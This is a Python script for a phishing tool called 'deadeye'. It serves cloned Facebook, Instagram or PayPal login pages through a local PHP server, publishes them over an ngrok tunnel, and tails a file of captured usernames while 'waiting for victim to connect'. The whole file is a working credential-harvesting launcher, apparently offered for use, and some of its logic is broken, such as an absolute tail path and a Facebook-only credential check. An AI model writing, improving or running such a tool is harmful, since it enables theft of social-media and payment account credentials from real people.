import sys
import subprocess
import time
import os

servers = {
    1: "Facebook",
    2: "Instagram",
    3: "PayPal"
}


def check_requirements():
    # PHP
    php = subprocess.run(['php', '-v'], stdout=subprocess.PIPE)
    if "No such file or directory" in str(php.stdout):
        print("PHP is not installed! EXIT")
        sys.exit(1)


def start_ngrok():
    print("Connecting to ngrok service...")
    subprocess.Popen("xterm -e ./ngrok http 80", stderr=None,
                     stdin=None, stdout=None, shell=True)
    time.sleep(5)


def start_php(selection):
    print("Starting PHP Server...")
    cmd = "xterm -e php -t " + "servers/" + selection.lower() + " -S 127.0.0.1:80"
    subprocess.Popen(cmd, stderr=None, stdout=None, stdin=None, shell=True)
    time.sleep(5)


# Todo: Create function to tail credentials files in realtime
def catch_creds():
    filestat = 0
    print("Waiting for victim to connect...")
    while filestat == 0:
        if os.path.isfile("servers/facebook/usernames.txt"):
            for root, dirs, files in os.walk(os.path.join(os.path.dirname(os.path.realpath(__file__)), "servers/facebook")):
                for file in files:
                    if file == "usernames.txt":
                        command8 = ['xterm', '-e', "tail -f /servers/facebook/usernames.txt"]
                        subprocess.call(command8, env=os.environ.copy())
                        filestat = 1


def teardown():
    print("Stopping php server.")
    os.system("killall -2 php")
    print("Stopping ngrok connection.")
    os.system("killall -2 ngrok")
    print("Deadeye closed.")


def main():
    check_requirements()
    print(servers)
    selection = int(input("What page do you want to load: "))

    try:
        print(servers[selection])
    except (TypeError, KeyError) as err:
        print("Wrong input!")
        main()

    start_ngrok()
    start_php(servers[selection])

    catch_creds()

    input("Press ENTER to exit deadeye")
    teardown()


if __name__ == '__main__':
    print("Loading deadeye...")
    try:
        main()
    except Exception:
        teardown()
